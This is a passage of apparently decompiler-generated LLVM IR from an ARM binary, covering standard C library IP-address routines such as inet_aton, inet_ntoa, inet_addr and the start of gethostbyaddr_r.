  br i1 %v9_27bcc, label %bb56, label %dec_label_pc_27c74

bb56:                                             ; preds = %dec_label_pc_27bdc
  %v1_27be0 = load i32, i32* @sb, align 4
  %v2_27be0 = trunc i32 %v1_27be0 to i8
  %v4_27be0 = inttoptr i32 %v2_27bf469 to i8*
  store i8 %v2_27be0, i8* %v4_27be0, align 1
  %v5_27be0 = load i32, i32* @r4, align 4
  %v6_27be0 = add i32 %v5_27be0, 1
  store i32 %v6_27be0, i32* @r4, align 4
  br label %dec_label_pc_27c74

dec_label_pc_27be8:                               ; preds = %dec_label_pc_27bd4, %dec_label_pc_27bcc, %dec_label_pc_27bc4
  %v2_27be8 = icmp eq i32 %v0_27bf071, 0
  store i1 %v2_27be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_27be8, label %dec_label_pc_27c58, label %dec_label_pc_27bf0

dec_label_pc_27bf0:                               ; preds = %dec_label_pc_27be8
  %v7_27bf0 = icmp eq i32 %v0_27bf071, 6
  store i1 %v7_27bf0, i1* %cpsr_z.global-to-local, align 1
  %v0_27bf4 = load i32, i32* @sb, align 4
  %v1_27bf4 = trunc i32 %v0_27bf4 to i8
  %v3_27bf4 = inttoptr i32 %v2_27bf469 to i8*
  store i8 %v1_27bf4, i8* %v3_27bf4, align 1
  %v4_27bf4 = load i32, i32* @r4, align 4
  %v5_27bf4 = add i32 %v4_27bf4, 1
  store i32 %v5_27bf4, i32* @r4, align 4
  %v0_27bf8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_27bf8, label %dec_label_pc_27bfc, label %dec_label_pc_27c58

dec_label_pc_27bfc:                               ; preds = %dec_label_pc_27bf0
  %v0_27bfc = load i32, i32* @r6, align 4
  %v2_27bfc = icmp eq i32 %v0_27bfc, 0
  store i1 %v2_27bfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_27bfc, label %dec_label_pc_27c04, label %dec_label_pc_27c58

dec_label_pc_27c04:                               ; preds = %dec_label_pc_27bfc
  %v0_27c04 = load i32, i32* @r7, align 4
  %v7_27c04 = icmp eq i32 %v0_27c04, 6
  store i1 %v7_27c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27c04, label %dec_label_pc_27c24, label %dec_label_pc_27c0c

dec_label_pc_27c0c:                               ; preds = %dec_label_pc_27c04
  %v7_27c0c = icmp eq i32 %v0_27c04, 5
  store i1 %v7_27c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27c0c, label %dec_label_pc_27c14, label %dec_label_pc_27c58

dec_label_pc_27c14:                               ; preds = %dec_label_pc_27c0c
  store i1 %v9_27c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_27c1c, label %dec_label_pc_27c24, label %dec_label_pc_27c58

dec_label_pc_27c24:                               ; preds = %dec_label_pc_27c14, %dec_label_pc_27c04
  %v2_27c28 = sub i32 %v2_27af4, %v5_27bf4
  %v1_27c2c = add i32 %v2_27c28, -32
  store i32 %v1_27c2c, i32* %r2.global-to-local, align 4
  %v0_27c30 = load i32, i32* @r8, align 4
  %v1_27c30 = add i32 %v0_27c30, 12
  store i32 %v1_27c30, i32* %r0.global-to-local, align 4
  %v3_27c38 = call i32 @inet_ntop4(i32 %v1_27c30, i32 %v5_27bf4, i32 %v1_27c2c)
  store i32 %v3_27c38, i32* %r0.global-to-local, align 4
  %v2_27c3c = icmp eq i32 %v3_27c38, 0
  store i1 %v2_27c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_27c3c, label %bb57, label %dec_label_pc_27c48

bb57:                                             ; preds = %dec_label_pc_27c24
  %v1_27c40 = load i32, i32* @r6, align 4
  store i32 %v1_27c40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27ce8

dec_label_pc_27c48:                               ; preds = %dec_label_pc_27c24
  %v0_27c48 = load i32, i32* @r4, align 4
  %v1_27c48 = inttoptr i32 %v0_27c48 to i8*
  store i32 %v0_27c48, i32* %r0.global-to-local, align 4
  %v3_27c4c = call i32 @strlen(i8* %v1_27c48)
  store i32 %v3_27c4c, i32* %r0.global-to-local, align 4
  %v0_27c50 = load i32, i32* @r4, align 4
  %v2_27c50 = add i32 %v0_27c50, %v3_27c4c
  store i32 %v2_27c50, i32* @r4, align 4
  %v0_27c88.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_27c88

dec_label_pc_27c58:                               ; preds = %dec_label_pc_27c14, %dec_label_pc_27c0c, %dec_label_pc_27bfc, %dec_label_pc_27bf0, %dec_label_pc_27be8
  %v0_27c60 = phi i32 [ %v5_27bf4, %dec_label_pc_27c14 ], [ %v5_27bf4, %dec_label_pc_27c0c ], [ %v5_27bf4, %dec_label_pc_27bfc ], [ %v5_27bf4, %dec_label_pc_27bf0 ], [ %v2_27bf469, %dec_label_pc_27be8 ]
  store i32 %v2_27af4, i32* @lr, align 4
  %v1_27c5c = load i32, i32* @r5, align 4
  %v4_27c5c = mul i32 %v1_27c5c, 4
  %v5_27c5c = add i32 %v4_27c5c, %v2_27af4
  store i32 %v0_27c60, i32* @r0, align 4
  %v1_27c64 = add i32 %v5_27c5c, -32
  %v2_27c64 = inttoptr i32 %v1_27c64 to i32*
  %v3_27c64 = load i32, i32* %v2_27c64, align 4
  store i32 %v3_27c64, i32* %r2.global-to-local, align 4
  %v0_27c68 = load i32, i32* @fp, align 4
  %v3_27c6c = call i32 @sprintf(i32 %v0_27c60, i32 %v0_27c68, i32 %v3_27c64)
  store i32 %v3_27c6c, i32* %r0.global-to-local, align 4
  %v0_27c70 = load i32, i32* @r4, align 4
  %v2_27c70 = add i32 %v0_27c70, %v3_27c6c
  store i32 %v2_27c70, i32* @r4, align 4
  br label %dec_label_pc_27c74

dec_label_pc_27c74:                               ; preds = %bb56, %dec_label_pc_27bdc, %dec_label_pc_27c58
  %v3_27be029 = phi i32 [ %v6_27be0, %bb56 ], [ %v2_27bf469, %dec_label_pc_27bdc ], [ %v2_27c70, %dec_label_pc_27c58 ]
  %v0_27c74 = load i32, i32* @r5, align 4
  %v1_27c74 = add i32 %v0_27c74, 1
  store i32 %v1_27c74, i32* @r5, align 4
  %v0_27bc4.pre = load i32, i32* @r6, align 4
  %v7_27c7c = icmp slt i32 %v1_27c74, 8
  %v7_27bc4 = icmp eq i32 %v0_27bc4.pre, -1
  store i1 %v7_27bc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27c7c, label %dec_label_pc_27bc4, label %dec_label_pc_27c80

dec_label_pc_27c80:                               ; preds = %dec_label_pc_27c74
  br i1 %v7_27bc4, label %.thread2, label %dec_label_pc_27c88

dec_label_pc_27c88:                               ; preds = %dec_label_pc_27c80, %dec_label_pc_27c48
  %v3_27c94 = phi i32 [ %v3_27be029, %dec_label_pc_27c80 ], [ %v2_27c50, %dec_label_pc_27c48 ]
  %v0_27c88 = phi i32 [ %v0_27bc4.pre, %dec_label_pc_27c80 ], [ %v0_27c88.pre, %dec_label_pc_27c48 ]
  %v1_27c88 = load i32, i32* @r7, align 4
  %v2_27c88 = add i32 %v1_27c88, %v0_27c88
  %v7_27c8c = icmp eq i32 %v2_27c88, 8
  store i1 %v7_27c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27c8c, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_27c88
  %v4_27c94 = inttoptr i32 %v3_27c94 to i8*
  store i8 58, i8* %v4_27c94, align 1
  %v5_27c94 = load i32, i32* @r4, align 4
  %v6_27c94 = add i32 %v5_27c94, 1
  store i32 %v6_27c94, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_27c88, %dec_label_pc_27c80, %bb58
  %v2_27c9c = phi i32 [ %v3_27c94, %dec_label_pc_27c88 ], [ %v3_27be029, %dec_label_pc_27c80 ], [ %v6_27c94, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_27c9c = inttoptr i32 %v2_27c9c to i8*
  store i8 0, i8* %v3_27c9c, align 1
  %v4_27c9c = load i32, i32* @r4, align 4
  %v5_27c9c = add i32 %v4_27c9c, 1
  store i32 %v2_27bac, i32* @r1, align 4
  %v2_27ca4 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_27ca4, i32* %r2.global-to-local, align 4
  %v2_27ca8 = sub i32 %v5_27c9c, %v2_27bac
  %v9_27cac = icmp eq i32 %v2_27ca8, %v2_27ca4
  store i1 %v9_27cac, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_27ca8, %v2_27ca4
  br i1 %tmp75, label %dec_label_pc_27cb4, label %dec_label_pc_27cc8

dec_label_pc_27cb4:                               ; preds = %.thread2
  %v0_27cb4 = call i32 @__GI___errno_location()
  store i32 %v0_27cb4, i32* %r0.global-to-local, align 4
  %v0_27cbc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_27cbc, i32* %r2.global-to-local, align 4
  %v2_27cc0 = inttoptr i32 %v0_27cb4 to i32*
  store i32 28, i32* %v2_27cc0, align 4
  %v0_27ce8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27ce8

dec_label_pc_27cc8:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_27ccc = inttoptr i32 %arg3 to i8*
  %v3_27ccc = call i32 @strcpy(i8* %v2_27ccc, i32 %v2_27bac)
  br label %dec_label_pc_27cd0

dec_label_pc_27cd0:                               ; preds = %dec_label_pc_27ab0, %dec_label_pc_27cc8
  %storemerge = phi i32 [ %v3_27abc, %dec_label_pc_27ab0 ], [ %v3_27ccc, %dec_label_pc_27cc8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27ce8

dec_label_pc_27cd8:                               ; preds = %dec_label_pc_27aa4
  %v0_27cd8 = call i32 @__GI___errno_location()
  store i32 %v0_27cd8, i32* %r0.global-to-local, align 4
  %v2_27ce0 = inttoptr i32 %v0_27cd8 to i32*
  store i32 97, i32* %v2_27ce0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27ce8

dec_label_pc_27ce8:                               ; preds = %bb57, %dec_label_pc_27cd0, %dec_label_pc_27cb4, %dec_label_pc_27cd8
  %v0_27ce8 = phi i32 [ %v1_27c40, %bb57 ], [ %storemerge, %dec_label_pc_27cd0 ], [ %v0_27ce8.pre, %dec_label_pc_27cb4 ], [ 0, %dec_label_pc_27cd8 ]
  store i32 %v0_27ce8, i32* %r0.global-to-local, align 4
  store i32 %v3_27a80, i32* @r4, align 4
  store i32 %v6_27a80, i32* @r5, align 4
  store i32 %v9_27a80, i32* @r6, align 4
  store i32 %v12_27a80, i32* @r7, align 4
  store i32 %v15_27a80, i32* @r8, align 4
  store i32 %v18_27a80, i32* @sb, align 4
  store i32 %v21_27a80, i32* @sl, align 4
  store i32 %v24_27a80, i32* @fp, align 4
  store i32 %v27_27a80, i32* @lr, align 4
  ret i32 %v0_27ce8

; uselistorder directives
  uselistorder i32 %v0_27ce8, { 1, 0 }
  uselistorder i1 %v7_27bc4, { 2, 0, 1 }
  uselistorder i32 %v0_27bc4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_27c74, { 0, 2, 1 }
  uselistorder i32 %v0_27c60, { 1, 0 }
  uselistorder i32 %v0_27c48, { 1, 0 }
  uselistorder i32 %v5_27bf4, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_27bcc, { 1, 0, 2 }
  uselistorder i32 %v2_27bf469, { 0, 3, 2, 1 }
  uselistorder i32 %v0_27bf071, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_27bc468, { 1, 0 }
  uselistorder i32 %v2_27bac, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_27bbc, { 1, 0, 2 }
  uselistorder i1 %v7_27b98, { 1, 0 }
  uselistorder i32 %v0_27b98, { 1, 2, 0 }
  uselistorder i32 %v1_27bbc.pre, { 2, 0, 1 }
  uselistorder i32 %v0_27b90.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_27b80, { 1, 0 }
  uselistorder i1 %v7_27b78, { 1, 0 }
  uselistorder i32 %v1_27b6c, { 1, 0 }
  uselistorder i32 %v0_27b80, { 1, 2, 0, 3 }
  uselistorder i32 %v0_27b94, { 1, 2, 0, 3 }
  uselistorder i1 %v7_27b34, { 1, 0 }
  uselistorder i32 %v0_27b6c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_27b50, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_27b60, { 3, 1, 0, 2 }
  uselistorder i32 %v1_27af0, { 1, 0, 2 }
  uselistorder i32 %v2_27ad8, { 1, 0 }
  uselistorder i32 %v0_27af0, { 3, 1, 0, 2 }
  uselistorder i32 %v2_27af4, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 6, 8, 7, 13, 9, 10, 11, 12, 14, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 23, 15, 16, 17, 18, 19, 0, 20, 21, 22 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_27ce8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_27cd0, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_27c74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_27bc4, { 1, 0 }
  uselistorder label %dec_label_pc_27b98._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27b98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27b90, { 1, 0 }
  uselistorder label %dec_label_pc_27b6c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_27b68, { 1, 0 }
  uselistorder label %dec_label_pc_27b20, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_27d04 = load i32, i32* @r4, align 4
  store i32 %v3_27d04, i32* %stack_var_-28, align 4
  %v0_27d0c = load i32, i32* %r0.global-to-local, align 4
  %v2_27d0c = icmp eq i32 %v0_27d0c, 0
  br i1 %v2_27d0c, label %dec_label_pc_27de8, label %dec_label_pc_27d1c

dec_label_pc_27d1c:                               ; preds = %entry
  br label %dec_label_pc_27d34

dec_label_pc_27d34:                               ; preds = %dec_label_pc_27d1c, %dec_label_pc_27dac
  %v1_27dac = phi i32 [ 0, %dec_label_pc_27d1c ], [ %v5_27dac, %dec_label_pc_27dac ]
  %v0_27db0 = phi i32 [ 1, %dec_label_pc_27d1c ], [ %v1_27db0, %dec_label_pc_27dac ]
  %v0_27d34 = phi i32 [ %v0_27d0c, %dec_label_pc_27d1c ], [ %v0_27d3412, %dec_label_pc_27dac ]
  %v1_27d34 = inttoptr i32 %v0_27d34 to i8*
  %v2_27d34 = load i8, i8* %v1_27d34, align 1
  %v3_27d34 = zext i8 %v2_27d34 to i32
  %v4_27d38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20828) to i32*), align 4
  %v2_27d3c = mul nuw nsw i32 %v3_27d34, 2
  %v2_27d40 = add i32 %v2_27d3c, %v4_27d38
  %v3_27d40 = inttoptr i32 %v2_27d40 to i16*
  %v4_27d40 = load i16, i16* %v3_27d40, align 2
  %v1_27d44 = and i16 %v4_27d40, 8
  %v2_27d44 = icmp eq i16 %v1_27d44, 0
  br i1 %v2_27d44, label %dec_label_pc_27de8, label %dec_label_pc_27d4c

dec_label_pc_27d4c:                               ; preds = %dec_label_pc_27d34
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_27d6c

dec_label_pc_27d54:                               ; preds = %dec_label_pc_27d6c
  %v2_27d54 = mul i32 %v0_27dac, 10
  %v1_27d58 = add i32 %v2_27d54, -48
  %v2_27d5c = add i32 %v3_27d6c, %v1_27d58
  store i32 %v2_27d5c, i32* @ip, align 4
  %v8_27d64 = icmp sgt i32 %v2_27d5c, 255
  br i1 %v8_27d64, label %dec_label_pc_27de8, label %dec_label_pc_27d68

dec_label_pc_27d68:                               ; preds = %dec_label_pc_27d54
  %v1_27d68 = add i32 %v0_27d9c, 1
  store i32 %v1_27d68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27d6c

dec_label_pc_27d6c:                               ; preds = %dec_label_pc_27d4c, %dec_label_pc_27d68
  %v0_27dac = phi i32 [ 0, %dec_label_pc_27d4c ], [ %v2_27d5c, %dec_label_pc_27d68 ]
  %v0_27d9c = phi i32 [ %v0_27d34, %dec_label_pc_27d4c ], [ %v1_27d68, %dec_label_pc_27d68 ]
  %v1_27d6c = inttoptr i32 %v0_27d9c to i8*
  %v2_27d6c = load i8, i8* %v1_27d6c, align 1
  %v3_27d6c = zext i8 %v2_27d6c to i32
  %v2_27d70 = mul nuw nsw i32 %v3_27d6c, 2
  %v2_27d74 = add i32 %v2_27d70, %v4_27d38
  %v3_27d74 = inttoptr i32 %v2_27d74 to i16*
  %v4_27d74 = load i16, i16* %v3_27d74, align 2
  %v6_27d74 = zext i16 %v4_27d74 to i32
  %v1_27d78 = and i32 %v6_27d74, 8
  %v2_27d78 = icmp eq i32 %v1_27d78, 0
  br i1 %v2_27d78, label %dec_label_pc_27d80, label %dec_label_pc_27d54

dec_label_pc_27d80:                               ; preds = %dec_label_pc_27d6c
  %v7_27d80 = icmp eq i32 %v0_27db0, 4
  br i1 %v7_27d80, label %dec_label_pc_27d98, label %dec_label_pc_27d88

dec_label_pc_27d88:                               ; preds = %dec_label_pc_27d80
  %v7_27d88 = icmp eq i8 %v2_27d6c, 46
  br i1 %v7_27d88, label %dec_label_pc_27d90, label %dec_label_pc_27de8

dec_label_pc_27d90:                               ; preds = %dec_label_pc_27d88
  %v1_27d90 = add i32 %v0_27d9c, 1
  store i32 %v1_27d90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27dac

dec_label_pc_27d98:                               ; preds = %dec_label_pc_27d80
  %v2_27d98 = icmp eq i8 %v2_27d6c, 0
  %v1_27d9c = add i32 %v0_27d9c, 1
  store i32 %v1_27d9c, i32* %r0.global-to-local, align 4
  br i1 %v2_27d98, label %dec_label_pc_27dac, label %dec_label_pc_27da4

dec_label_pc_27da4:                               ; preds = %dec_label_pc_27d98
  %v1_27da4 = and i32 %v6_27d74, 32
  %v2_27da4 = icmp eq i32 %v1_27da4, 0
  br i1 %v2_27da4, label %dec_label_pc_27de8, label %dec_label_pc_27dac

dec_label_pc_27dac:                               ; preds = %dec_label_pc_27da4, %dec_label_pc_27d98, %dec_label_pc_27d90
  %v0_27d3412 = phi i32 [ %v1_27d9c, %dec_label_pc_27da4 ], [ %v1_27d9c, %dec_label_pc_27d98 ], [ %v1_27d90, %dec_label_pc_27d90 ]
  %v4_27dac = mul i32 %v1_27dac, 256
  %v5_27dac = or i32 %v0_27dac, %v4_27dac
  %v1_27db0 = add nuw nsw i32 %v0_27db0, 1
  %v7_27db8 = icmp slt i32 %v1_27db0, 5
  br i1 %v7_27db8, label %dec_label_pc_27d34, label %dec_label_pc_27dbc

dec_label_pc_27dbc:                               ; preds = %dec_label_pc_27dac
  %v2_27dbc = icmp eq i32 %arg2, 0
  br i1 %v2_27dbc, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_27dbc
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27dec

bb:                                               ; preds = %dec_label_pc_27dbc
  %v4_27dc0 = udiv i32 %v5_27dac, 16777216
  %v2_27dc4 = udiv i32 %v5_27dac, 256
  %v5_27dc8 = and i32 %v2_27dc4, 65280
  %v2_27dcc = and i32 %v5_27dac, 65280
  %v5_27dd0 = mul nuw nsw i32 %v2_27dcc, 256
  %v5_27dd4 = mul i32 %v0_27dac, 16777216
  %v6_27dc8 = or i32 %v4_27dc0, %v5_27dd4
  %v6_27dd0 = or i32 %v6_27dc8, %v5_27dc8
  %v6_27dd4 = or i32 %v6_27dd0, %v5_27dd0
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_27de0 = inttoptr i32 %arg2 to i32*
  store i32 %v6_27dd4, i32* %v3_27de0, align 4
  %v2_27dec.pre = load i32, i32* %stack_var_-28, align 4
  %v1_27df0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27dec

dec_label_pc_27de8:                               ; preds = %dec_label_pc_27d88, %dec_label_pc_27da4, %dec_label_pc_27d34, %dec_label_pc_27d54, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27dec

dec_label_pc_27dec:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_27de8
  %v1_27df0 = phi i32 [ %v1_27df0.pre, %bb ], [ 0, %dec_label_pc_27de8 ], [ 1, %.thread7.thread ]
  %v2_27dec = phi i32 [ %v2_27dec.pre, %bb ], [ %v3_27d04, %dec_label_pc_27de8 ], [ %v3_27d04, %.thread7.thread ]
  store i32 %v2_27dec, i32* @r4, align 4
  ret i32 %v1_27df0

; uselistorder directives
  uselistorder i32 %v1_27db0, { 1, 0 }
  uselistorder i32 %v5_27dac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_27d9c, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_27dec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27de8, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_27d6c, { 1, 0 }
  uselistorder label %dec_label_pc_27d34, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_27dfc = load i32, i32* @r4, align 4
  %v6_27dfc = load i32, i32* @r5, align 4
  %v9_27dfc = load i32, i32* @r6, align 4
  %v12_27dfc = load i32, i32* @r7, align 4
  %v15_27dfc = load i32, i32* @r8, align 4
  %v18_27dfc = load i32, i32* @sb, align 4
  %v21_27dfc = load i32, i32* @sl, align 4
  %v24_27dfc = load i32, i32* @fp, align 4
  %v0_27e00 = load i32, i32* @r0, align 4
  %v5_27e1c = call i32 @llvm.bswap.i32(i32 %v0_27e00)
  %v0_27e20 = load i32, i32* @r1, align 4
  %v1_27e20 = add i32 %v0_27e20, 15
  store i32 %v1_27e20, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_27e5c

dec_label_pc_27e40:                               ; preds = %dec_label_pc_27e5c
  %v1_27e48 = inttoptr i32 %v0_27e78 to i8*
  %v2_27e48 = call i32 @_uintmaxtostr(i8* %v1_27e48)
  %v0_27e4c = load i32, i32* @r6, align 4
  %v2_27e4c = icmp eq i32 %v0_27e4c, 0
  %v1_27e50 = add i32 %v2_27e48, -1
  store i32 %v1_27e50, i32* @r1, align 4
  br i1 %v2_27e4c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_27e40
  %v1_27e54 = load i32, i32* @sl, align 4
  %v2_27e54 = trunc i32 %v1_27e54 to i8
  %v4_27e54 = inttoptr i32 %v0_27e4c to i8*
  store i8 %v2_27e54, i8* %v4_27e54, align 1
  %v0_27e58.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_27e40, %bb
  %v0_27e58 = phi i32 [ %v1_27e50, %dec_label_pc_27e40 ], [ %v0_27e58.pre, %bb ]
  store i32 %v0_27e58, i32* @r6, align 4
  %v0_27e5c.pre = load i32, i32* @r5, align 4
  %v0_27e60.pre = load i32, i32* @r7, align 4
  %v1_27e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_27e5c

dec_label_pc_27e5c:                               ; preds = %entry, %bb17
  %v0_27e78 = phi i32 [ %v1_27e20, %entry ], [ %v0_27e58, %bb17 ]
  %v1_27e60 = phi i32 [ %v5_27e1c, %entry ], [ %v1_27e60.pre, %bb17 ]
  %v0_27e60 = phi i32 [ 255, %entry ], [ %v0_27e60.pre, %bb17 ]
  %v0_27e70 = phi i32 [ 0, %entry ], [ %v0_27e5c.pre, %bb17 ]
  %v7_27e5c = icmp eq i32 %v0_27e70, 3
  store i1 %v7_27e5c, i1* @cpsr_z, align 1
  %v2_27e60 = and i32 %v0_27e60, %v1_27e60
  store i32 %v2_27e60, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_27e6c = udiv i32 %v1_27e60, 256
  store i32 %v3_27e6c, i32* @r4, align 4
  %v1_27e70 = add i32 %v0_27e70, 1
  store i32 %v1_27e70, i32* @r5, align 4
  %v7_27e74 = icmp sgt i32 %v0_27e70, 3
  br i1 %v7_27e74, label %dec_label_pc_27e78, label %dec_label_pc_27e40

dec_label_pc_27e78:                               ; preds = %dec_label_pc_27e5c
  %v1_27e78 = add i32 %v0_27e78, 1
  store i32 %v3_27dfc, i32* @r4, align 4
  store i32 %v6_27dfc, i32* @r5, align 4
  store i32 %v9_27dfc, i32* @r6, align 4
  store i32 %v12_27dfc, i32* @r7, align 4
  store i32 %v15_27dfc, i32* @r8, align 4
  store i32 %v18_27dfc, i32* @sb, align 4
  store i32 %v21_27dfc, i32* @sl, align 4
  store i32 %v24_27dfc, i32* @fp, align 4
  ret i32 %v1_27e78

; uselistorder directives
  uselistorder i32 %v0_27e70, { 2, 0, 1 }
  uselistorder i32 %v0_27e58, { 1, 0 }
  uselistorder label %dec_label_pc_27e5c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55200), i32* @r1, align 4
  %v0_27e98 = call i32 @__GI_inet_ntoa_r()
  %v0_27e9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_27e9c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_27e9c = load i32, i32* @ip, align 4
  %v3_27e9c = load i32, i32* @r1, align 4
  %v4_27e9c = inttoptr i32 %v3_27e9c to i32*
  store i32 %v1_27e9c, i32* %v4_27e9c, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_27e98

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_27eac = ptrtoint i32* %stack_var_-12 to i32
  %v0_27eb0 = load i32, i32* @r0, align 4
  %v2_27eb0 = inttoptr i32 %v0_27eb0 to i8*
  %v3_27eb0 = call i32 @inet_aton(i8* %v2_27eb0, i32 %v2_27eac)
  %v2_27eb4 = icmp eq i32 %v3_27eb0, 0
  %v4_27eb8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_27eb4, i32 -1, i32 %v4_27eb8
  ret i32 %storemerge
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_27ecc = load i32, i32* @r4, align 4
  %v6_27ecc = load i32, i32* @r5, align 4
  %v9_27ecc = load i32, i32* @r6, align 4
  %v12_27ecc = load i32, i32* @r7, align 4
  %v15_27ecc = load i32, i32* @r8, align 4
  %v18_27ecc = load i32, i32* @sb, align 4
  %v21_27ecc = load i32, i32* @sl, align 4
  %v24_27ecc = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_27ee0 = icmp eq i8* %arg1, null
  %v2_27ee8 = inttoptr i32 %tmp16 to i32*
  store i32 0, i32* %v2_27ee8, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v0_27ef8 = load i32, i32* @r1, align 4
  store i32 %v0_27ef8, i32* @r8, align 4
  %v0_27efc = load i32, i32* @r2, align 4
  %v0_27f00 = load i32, i32* @r3, align 4
  store i32 %v0_27f00, i32* @sl, align 4
  %v2_27f08 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_27f08, i32* @r4, align 4
  store i32 %tmp14, i32* @r5, align 4
  br i1 %v3_27ee0, label %dec_label_pc_28190, label %dec_label_pc_27f10

dec_label_pc_27f10:                               ; preds = %entry
  %v7_27f10 = icmp eq i32 %v0_27efc, 2
  br i1 %v7_27f10, label %dec_label_pc_27f30, label %dec_label_pc_27f18

dec_label_pc_27f18:                               ; preds = %dec_label_pc_27f10
  %v7_27f18 = icmp eq i32 %v0_27efc, 10
  br i1 %v7_27f18, label %dec_label_pc_27f2c, label %dec_label_pc_28190

